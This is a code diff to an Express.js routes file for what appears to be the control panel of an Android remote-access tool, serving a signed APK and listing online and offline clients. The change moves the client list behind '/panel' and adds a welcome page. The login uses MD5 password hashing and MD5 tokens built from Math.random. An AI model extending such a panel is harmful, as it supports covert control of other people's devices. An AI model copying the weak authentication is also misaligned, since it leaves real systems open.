@@ -30,16 +30,26 @@ routes.get('/dl', (req, res) => {
     res.redirect('/build-aligned-signed.apk');
 });
 
-routes.get('/', isAllowed, (req, res) => {
+// routes.get('/', isAllowed, (req, res) => {
+//     res.render('index', {
+//         clientsOnline: clientManager.getClientListOnline(),
+//         clientsOffline: clientManager.getClientListOffline()
+//     });
+// });
+
+routes.get('/', (req, res) => {
+    res.render('welcome')
+});
+
+routes.get('/login', (req, res) => {
+    res.render('login');
+});
+
+routes.get('/panel', isAllowed, (req, res) => {
     res.render('index', {
         clientsOnline: clientManager.getClientListOnline(),
         clientsOffline: clientManager.getClientListOffline()
     });
-});
-
-
-routes.get('/login', (req, res) => {
-    res.render('login');
 });
 
 routes.post('/login', (req, res) => {
@@ -51,7 +61,7 @@ routes.post('/login', (req, res) => {
             if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                 let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                 db.maindb.get('admin').assign({ loginToken }).write();
-                res.cookie('loginToken', loginToken).redirect('/');
+                res.cookie('loginToken', loginToken).redirect('/panel');
             } else return res.redirect('/login?e=badLogin');
         } else return res.redirect('/login?e=missingPassword');
     } else return res.redirect('/login?e=missingUsername');
